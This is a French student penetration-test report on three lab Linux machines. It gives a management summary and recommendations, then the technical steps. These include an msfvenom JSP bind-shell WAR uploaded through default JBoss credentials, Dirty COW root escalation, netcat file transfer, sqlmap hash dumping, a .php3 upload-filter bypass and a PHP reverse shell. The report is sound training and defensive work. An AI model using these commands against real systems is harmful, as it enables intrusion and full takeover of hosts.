# TL de Pentest

**Arthur Dang et Negre Léo**

## I - Introduction

**Contexte**  
La société XXX nous a contacté pour effectuer un test de pénétration sur son système d'information

**Périmètre**  
Par système d'information on entend les trois machines Linux:  
- Alice 192.168.56.2
- Bob 192.168.56.3
- Charlie 192.168.56.4

**Objectifs**  
L'objectif est de pénétrer les trois machines, et d'y obtenir des privilèges administrateurs.

**Méthodes**    
Le choix des méthodes est laissé aux pentesters. Nous n'avons initialement pas accès au code source des différentes pages web et services des machines (analyse boite noire).

**Charge**  
Le test de pénétration est effectué en 4 demi journées.

## II - Résumé Managerial  

L'objectif est rempli: nous avons en 4 demi-journées avoir des accès privilégiés aux trois machines du réseau de XXX. Les défenses que nous avons rencontrées, quoique existantes, n'étaient pas suffisantes. EN suivant l'échelle de l'ANSSI, nous estimons:
- un attaquant de niveau 2 serait capable de nuire à votre système d'information. Pour reprendre les termes de l'ANSSI, cela correspond à un hobbyiste, seul.
- les conséquences de l'attaque seraient de niveau 4 puisqu'il aurait les accès administrateurs sur toutes les machines, et donc un contrôle total de votre système d'information.  
Voici nos principales recommandations:

**Suivre la politique de mot de passe de l'ANSSI.** *https://www.ssi.gouv.fr/uploads/IMG/pdf/NP_MDP_NoteTech.pdf*
Sur chacune des machines, nous avons utilisés des combinaisons login/mot de passe extrêmement basiques. Un attaquant de très faible niveau technique est actuellement capable de pénétrer vos machines.  
Nous recommandons donc immédiatement de changer à des mots de passe plus complexes, puis de mettre en place rapidement la politique de mot de passe conseillée par l'ANSSI.   

**Mise à jour des systèmes** 
Sur chacune des machines nous avons pu utiliser exactement le même exploit `dirtycow` pour l'élévation de privilèges. C'est une faille puissante et connue depuis plusieurs années, elle a été patchée mais vos versions d'OS sont trop anciennes. 
Nous recommandons donc immédiatement de mettre à jour vos systèmes sur les trois machines, et d'avoir un employé responsable de veille cyber pour être au fait des attaques les plus récentes et patcher les failles dès que les mises à jour sont disponibles.

**Gestion de l'ouverture des ports**  
Sur Alice en particulier, nous avons réalisé un scan de ports extrêmement facilement. Cela permet aux attaquants de voir facilement par où attaquer. Un port ouvert sera toujours détectable, mais vous pouvez les rendre moins faciles à trouver.
Nous recommandons d'appliquer une politique de réponse au scan de ports pour éviter les scans de port en brute force, comme vous l'avez fait sur Charlie par exemple, et de filtrer l'accès aux IPs connues autant que possible avec une politique de firewall plus sévère. Surveiller les logs de scan de port peut permettre de détecter des attaquants débutants avant même qu'ils ne pénètrent votre système.

**Formation aux principes de base de cybersécurité**
Bien que nous ayons réussi à pénétrer les trois machines en un temps faible avec des failles simples (mots de passe, dirtycow), il est très probable que votre système ait d'autres failles plus complexes. 
Nous recommandons donc de former un développeur de votre équipe à quelques notions de cybersécurité en passant par exemple une certification (ISC)2 ou ISACA, ou d'embaucher un expert en cybersécurité. Il serait responsable du suivi de la sensibilisation des employés aux bonnes pratiques (politique de mot de passe, phishing) ainsi que du suivi des failles et mises à jour du système. Idéalement, il ferait lui-même des tests d'intrusion bi-annuels pour tester la robustesse du système.  
Enfin nous conseillons de refaire un test d'intrusion une fois ces changements effectués.

## III - Contenu Technique 

Nous commençons par lancer un scan du sous-réseau à partir de notre machine Kali pour voir les machines que l'on peut détecter.

![img](assets/alice_scan_reseau.png)

Nous détectons notre machine hôte (192.168.56.1) et notre VM kali (192.168.56.103) mais aussi une nouvelle machine que nous allons appeler Alice avec l'adresse IP `192.168.56.2`.

Nous avons donc commencer par analyser cette machine.

### 1 - Exploitation de Alice

Pour essayer de voir les failles de vulnérabilités d'Alice, nous avons scanné ses ports pour voir lesquels étaient ouverts.

![img](assets/alice_scan_port.png)

#### Port 80 - Http - Apache httpd 2.2.16

Ce port héberge un serveur http qui affiche le site qu'il héberge lorsque l'on se connecte dessus.

Dans un premier temps avec une navigation avec le navigateur à l'adresse 192.168.56.2:80, on nous affiche une page web basique sans importance.

#### Port 8080 - http - Apache Tomcat/Coyote JSP Engine 1.1

Le port 8080 est habituellement utilisé pour pour le développement de son application web.

Il affiche aussi un site web plus fourni avec en particulier une application qui affiche un calendrier.

En effectuant un scan de directory avec l'outil `dirb` ou l'auxiliaire `dir_scanner` de metasploit, on n'observe aucun fichier sensible en particulier.

![img](assets/alice_dirb_8080.png)

On peut chercher les CVE connues à la version Apache Tomcat/Coyote JSP Engine 1.1.

#### Port 9990 - http - JBoss Admnistrator

Jboss administator est un serveur d'applicaiton aidant à la gestion d'un serveur web.

**Connection sur le site d'administration**  
En navigant sur ce port on arrive facilement à trouver la page d'authentification en testant les pages /manager, /host-manager pour faire des actions d'admin. Les crédentials sont `admin:admin` que l'ont a pu trouvé en testant les plus courants. Nous recommandons d'appliquer une politique de mots de passe (voir II).

![img](assets/alice_jboss_manage.png)

**Mise en place de la backdoor**  
Nous avons alors créer un programme qui ouvrait un bind shell conforme à la plateforme JBoss. (En java compressé en .war).

Nous l'avons réalisé avec l'outil msfvenom pour se connecter au port 1234:
`msfvenom -p java/jsp_shell_bind_tcp LPORT=1234 -f war > shell.war`

En uploadant ce programme sur le serveur Jboss et en exécutant cette application en navigant à l'url `192.168.56.2/shell/` pour l'exécuter, notre backdoor a été lancée et nous pouvons nous y connecter pour accéder à un shell.

`nc 192.168.56.2 1234`
Nous pouvons vérifier notre connection en testant des commandes.

**Elevation de privilèges**  
Nous voyons que nous somme connectés en tant que user "jboss". Et nous allons essayer d'avoir les droits roots pour vraiment prendre le contrôle de la machine.

`uname -a` permet de voir la version de l'os et de voir si il y a des failles connues pour cette machine.
`Linux Alice 2.6.32-5-686 #1 SMP Sun Sep 23 UTC 2012 i686 GNU/Linux`

Cette version d'OS est en particulier vulnérable à l'exploit dirtycow qui permet de créer un user avec les droits root. Nous recommandons de mettre à jour immédiatement votre système (voir II).  

On télécharge le programme dirty.c qui permet réaliser l'exploit. Qu'on transmet sur la machine d'alice via la backdoor que l'on a créer, qu'on compile et exécute.
La transmission du fichier a été réalisée avec: `nc -l -p 4444 < dirty.c` sur notre machine et `nc 192.168.56.1 4444 > dirty.c`.

```bash
$ ./dirty
Please enter the new password: firefart
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash

mmap: b77ad000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'firefart'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash

mmap: b77ad000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'firefart'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

On peut alors se connecter avec notre nouvel utilisateur `firefart` qui à les droits root. En ouvrant bien un terminal pour pouvoir avoir les retours du shell (demande de mot de passe..)

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
jboss$ su firefart
Password: firefart
```

### Exploitation de Bob

**Scan des ports**  
En réalisant un scan à partir d'Alice, on voit qu'on peut trouver une machine qu'on appelera Bob à l'adresse 192.168.56.3.  

**Connexion en ssh**  
Son port SSH étant ouvert, on essaie de s'y connecter, et `user:user` fonctionne. Nous recommandons d'appliquer une politique de mots de passe (voir II).  

**Elevation de privilèges**  
On réutilise l'exploit dirtycow, en transmettant par scp dirty.c depuis Alice jusqu'à Bob, puis en compilant et lançant le programme c. Il fonctionne de la même manière que sur Alice. Nous recommandons de mettre immédiatement à jour votre système (voir II).   

**Analyse de Bob**  
Une fois qu'on a l'utilisateur privilégié firefart, on utilise netstat pour avoir plus d'informations sur les ports ouverts et évaluer les failles de la machine.
```
firefart@metasploitable:/home/user# netstat -nltp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:45504           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:35750           0.0.0.0:*               LISTEN      4167/rpc.mountd 
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      4037/mysqld     
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      4176/smbd       
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      3499/portmap    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      4290/apache2    
tcp        0      0 0.0.0.0:52018           0.0.0.0:*               LISTEN      3537/rpc.statd  
tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      4201/xinetd     
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      4201/xinetd     
tcp        0      0 192.168.56.3:53         0.0.0.0:*               LISTEN      3890/named      
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      3890/named      
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      3890/named      
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      4176/smbd       
tcp6       0      0 :::2121                 :::*                    LISTEN      4237/proftpd: (acce
tcp6       0      0 :::53                   :::*                    LISTEN      3890/named      
tcp6       0      0 :::22                   :::*                    LISTEN      3914/sshd       
tcp6       0      0 ::1:953                 :::*                    LISTEN      3890/named   
```

### Exploitation de Charlie
**Scan des ports**  
On trouve une machine qu'on appellera Charlie à l'adresse 192.168.56.4. Une analyse des ports et services nous montre qu'elle a les ports 22, 80, 111, 53526 ouverts. Cependant on reconnait pas l'OS exact de la machine, il est donc compliqué de trouver une faille, on décide lors de se concentrer sur le service web de Charlie.   
```
Interesting ports on 192.168.56.4:
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh      (protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.16 ((Debian))
111/tcp   open  rpcbind  2 (rpc #100000)
53526/tcp open  status   1 (rpc #100024)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port22-TCP:V=4.53%I=7%D=1/28%Time=5E2FF89F%P=i686-pc-linux-gnu%r(NULL,2
SF:9,"SSH-2\.0-OpenSSH_5\.5p1\x20Debian-6\+squeeze2\r\n");
MAC Address: 08:00:27:76:3A:24 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://insecure.org/nmap/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=4.53%D=1/28%OT=22%CT=1%CU=42437%PV=Y%DS=1%G=Y%M=080027%TM=5E2FF8B
OS:0%P=i686-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%II=I%TS=8)OPS(O1=M5B
OS:4ST11NW4%O2=M5B4ST11NW4%O3=M5B4NNT11NW4%O4=M5B4ST11NW4%O5=M5B4ST11NW4%O6
OS:=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF
OS:=Y%T=40%W=16D0%O=M5B4NNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11NW4%RD=0%Q=)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%TOS=C0%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUL=G%RUD=G)IE(R=Y%DFI=N%T=40%TOSI=S%CD=S%SI=
OS:S%DLI=S)


Uptime: 0.005 days (since Tue Jan 28 03:55:36 2020)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at http://insecure.org/nmap/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.064 seconds

```
On souhaite pour cela accéder au port 80 de Charlie à partir de la Kali.  

**Création d'un tunnel ssh pour interagir depuis la Kali**     
*Première tentative*    
On essaie de créer un tunnel partant de la Kali, passant par Alice, puis Bob, qui atteindrait Charlie sur son port 80. Nous n'avons pas réussi à cause d'un problème de loopback sur Bob. Puisqu'on a des droits privilégiés sur Bob, on préfère simplement ajouter notre Kali aux machines pouvant se connecter sur Bob en ssh.  
`firefart@bob iptables -A input -p tcp -s <Kali IP> -j ACCEPT`  
Puis à partir de la Kali:  
`root@kali ssh -L 1234:<Charlie IP>:4444 firefart@Bob`  
On peut tester avec le navigateur internet de la kali sur localhost:1234 ou avec ```wget localhost:1234```    
Il contient plusieurs pages avec des images, ainsi qu'un onglet admin. On essaie quelques identifiants et injonction SQL de base, sans succès. On va chercher à scanner les fichiers auxquels on peut accéder. Pour cela on utilise l'exploit files_dir qui nous retourne  
```
msf5 auxiliary(scanner/http/files_dir) > run

[*] Using code '404' as not found for files with extension .null
...
[*] Using code '404' as not found for files with extension .php
[+] Found http://127.0.0.1:1234/all.php 200
[+] Found http://127.0.0.1:1234/cat.php 200
[+] Found http://127.0.0.1:1234/header.php 200
[+] Found http://127.0.0.1:1234/index.php 200
[+] Found http://127.0.0.1:1234/show.php 200
[*] Using code '404' as not found for files with extension .tar
[+] Found http://127.0.0.1:1234/website.tar 200
[*] Using code '404' as not found for files with extension .tar.gz
[+] Found http://127.0.0.1:1234/website.tar.gz 200
[*] Using code '404' as not found for files with extension .tgz
...
[*] Using code '404' as not found for files with extension 
[+] Found http://127.0.0.1:1234/admin 301
[+] Found http://127.0.0.1:1234/all 200
[+] Found http://127.0.0.1:1234/cat 200
[+] Found http://127.0.0.1:1234/classes 301
[+] Found http://127.0.0.1:1234/css 301
[+] Found http://127.0.0.1:1234/images 301
[+] Found http://127.0.0.1:1234/header 200
[+] Found http://127.0.0.1:1234/index 200
[+] Found http://127.0.0.1:1234/manual 301
[+] Found http://127.0.0.1:1234/show 200
[+] Found http://127.0.0.1:1234/website 200
[*] Using code '404' as not found for files with extension 
[+] Found http://127.0.0.1:1234/admin 301
[+] Found http://127.0.0.1:1234/all 200
[+] Found http://127.0.0.1:1234/cat 200
[+] Found http://127.0.0.1:1234/classes 301
[+] Found http://127.0.0.1:1234/css 301
[+] Found http://127.0.0.1:1234/images 301
[+] Found http://127.0.0.1:1234/header 200
[+] Found http://127.0.0.1:1234/index 200
[+] Found http://127.0.0.1:1234/manual 301
[+] Found http://127.0.0.1:1234/show 200
[+] Found http://127.0.0.1:1234/website 200
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
On peut donc récupérer sur le path /website le code du site. On cherche en particulier la page correspondant à la gestion du login sur l'onglet admin, et dans user.php on voit 
```
class User {
  const SITE= "PHOTOBLOG";
  function login($user, $password) {
    $sql = "SELECT * FROM users where login=\"";
    $sql.= mysql_real_escape_string($user);
    $sql.= "\" and password=md5(\"";
    $sql.= mysql_real_escape_string($password);
    $sql.= "\")";
    $result = mysql_query($sql);
    if ($result) {
      $row = mysql_fetch_assoc($result);
      if ($user === $row['login']) {
        return TRUE;
      }
    }
    else 
      echo mysql_error();
    return FALSE;
    //die("invalid username/password");
  }

```
Sur la page d'idenfitication admin, le serveur execute "SELECT * FROM users where login = "$user" and passwod = md5("$password"), mais mysql_real_escape_string empêche les injonctions SQL, en tout cas celles que nous sommes capables de faire à notre niveau.  

**SQLMap**   
En analysant le reste du code en particulier db.php, on voit qu'il y a une base de données mysql sous-jacente. On utilise l'outil kali sqlmap pour obtenir des informations à propos de la base de données.   
```sqlmap -u "http://localhost:1234/cat.php?id=2" -a``` est très verbeux, et en filtrant correctement les résultats, on récupère les hashs md5 des mots de passe. Sqlmap propose de les cracker. On trouve ainsi le couple login ```admin``` password  ```P4ssw0rd```. Nous recommandons de suivre une politique de mots de passe (voir II).

**Upload de fichier**  
On se connecte à l'onglet admin. On peut maintenant upload des images dans un des onglets. Comme pour Alice, on va chercher à uploader un fichier malicieux, puis de naviguer jusqu'à lui par le navigateur pour l'éxécuter. On cherche à éxécuter plus particulièrement un reverse shell Cependant on ne peut pas envoyer n'importe quel fichier: le serveur demande des images et refuse les php.  

*Première tentative:*   
Si la vérification s'effectue coté client, on peut:
1. Uploader le fichier .php
2. Intercepter le paquet, avec l'outil Burp Suite
3. Remplacer dans le paquet le .php par un .jpg ou .png
4. Forwarder le paquet

[![Burp suite image](https://github.com/L-e-N/PenTest/blob/master/assets/charlie_burp_suite.png)](https://github.com/L-e-N/PenTest/blob/master/assets/charlie_burp_suite.png)
Ca ne fonctionne pas, c'est parce que la vérification s'effectue coté serveur.

*Deuxième tentative:*   
On veut plus d'informations sur comment est effectuée la vérification. Dans le code source, picture.php montre comment le serveur différencie image de php.
```
function create(){
  if(isset($_FILES['image'])){
    $dir = 'uploads/';
    $file = basename($_FILES['image']['name']);

    if (!preg_match('/\w{3,12}.\w{2,4}$/',$file)) {
      DIE("The filename should only contains between 3 to 8 letters");
    }
    if (preg_match('/\.php$/',$file)) {
      DIE("NO PHP!!");
    }

    if(!move_uploaded_file($_FILES['image']['tmp_name'], $dir . $file)) {
      die("Error during upload");
    }
    $sql = "INSERT INTO pictures (title, img, cat) VALUES ('";
    $title = mysql_real_escape_string($_POST["title"]);
    $img = mysql_real_escape_string( $file);
    $cat = (int)$_POST["category"];
    $sql .= $title."','".$img."','".$cat;
    $sql.= "')";
    echo $sql;
    $result = mysql_query($sql);
    echo mysql_error(); 
  }
  }
  ```
On observe les protections: on ne peut pas uploader de .php, ni effectuer de commandes dans le champ 'titre'. Il est très simple de contourner cette limitation, en utilisant une extension de fichier .php3 ou .PHp, cependant utiliser par exemple .php.jpg ou .php%00.jpg ne fonctionne pas.

**Payload pour le reverse shell**  
1. Sur Kali, On prend reverse_shell.php (https://github.com/pentestmonkey/php-reverse-shell). On modifie l'IP et le Port pour envoyer le shell vers Bob, en effet notre Kali n'est pas accessible depuis Charlie. On modifie également le nom du fichier en .php3.
2. Sur Bob, on écoute `nc -lvp 8888`
3. Sur Kali, on uploade reverse_shell.php sur l'onglet admin de Charlie, et on lance le fichier en naviguant.
4. Sur Bob, on teste le shell avec `uname` qui renvoie bien `Linux`

**Payload pour l'élévation de privilèges**  
Sur le shell on se met dans /tmp, on essaie de copier le code source c de dirtycow, mais Charlie n'a pas vim ni nano, c'est peu pratique. On souhaite uploader dirty.c d'une manière ou d'une autre, on pourrait faire de la même manière que Bob mais on essaie de continuer d'exploiter les faiblesses de l'onglet admin.
1. Sur Kali, on uploade le code source c de dirtycow sous le nom dirty.html
2. Sur Kali, on uploade un fichier path.php3 très simple effectuant simplement l'instruction `pwd`.
3. Sur Kali, on navigue à path.php3. On trouve var/www/admin/uploads, qui est le path où sont stockés les images uploadées.
3. Sur Bob dans le shell de Charlie, on renomme dirty.html en dirty.c
4. On compile et éxécute dirty.c

On a alors un accès privilégié à Charlie. Nous recommandons de mettre immédiatement à jour le système (voir II).

## IV - Conclusion  
L'objectif de la mission a été accompli: en 4 demi-journées, nous avons obtenu des accès privilégiés à toutes les machines. Il existait des protections de base sur les machines. Elles n'étaient pas suffisantes: nous avons exploité des mots de passe faibles, ou des failles classiques et connues. Nos recommandations principales sont d'utiliser la politique de mot de passe conseillée par l'ANSSI, et de mettre à jour vos machines plus régulièrement.  
Il existe très probablement des failles plus complexes, nous vous conseillons donc de commencer par celles que nous avons expliquées, puis de refaire un test de pénétration en laissant plus de temps aux Pentesteurs.  
Enfin nous recommandons de former un développeur de votre équipe à quelques notions de cybersécurité en passant par exemple (ISC)2 ou ISACA, ou d'embaucher un expert en cybersécurité, pour être au fait des failles les plus récentes.

